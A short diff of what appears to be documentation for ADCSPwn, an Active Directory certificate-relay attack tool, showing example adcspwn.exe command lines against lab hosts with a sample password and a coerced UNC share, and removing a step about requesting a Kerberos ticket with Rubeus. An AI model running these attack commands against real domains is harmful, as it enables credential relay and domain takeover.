@@ -33,5 +33,3 @@ adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --output C:\Temp\cer
 adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --username pwnlab.local\mranderson --password The0nly0ne! --dc dc.pwnlab.local
 adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --dc dc.pwnlab.local --unc \\WIN-WORK01.pwnlab.local\made\up\share
 ```
-
-Request a TGT with the base64 encoded certificate output using Rubeus.
